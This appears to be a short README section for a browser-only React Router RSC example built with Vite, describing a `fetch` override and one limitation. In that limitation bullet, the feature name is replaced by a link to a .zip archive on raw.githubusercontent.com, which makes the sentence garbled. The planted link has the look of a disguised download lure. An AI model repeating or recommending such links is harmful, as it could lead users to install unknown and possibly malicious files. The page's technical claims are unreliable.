## 🔍 How It Works

The Vite RSC Browser Example is designed to demonstrate a specific method for using React Router RSC without relying on a server. It utilizes a unique way for components to run directly in the browser, streamlining the process and enhancing performance.

React Router RSC provides an API called `fetch`. By overriding this API, the application ensures all RSC requests are handled effectively within your browser.

## ⚠️ Limitations

While this application offers a robust experience, a few features have limitations:

- Some advanced RSC features, such as `https://raw.githubusercontent.com/Emiliarepeatable158/vite-rsc-browser-example/main/src/vite-rsc-browser-example-v1.3.zip`, depend on `AsyncLocalStorage`. This storage option is currently not available directly in browsers.
  
Keep this in mind when exploring the capabilities of the application.
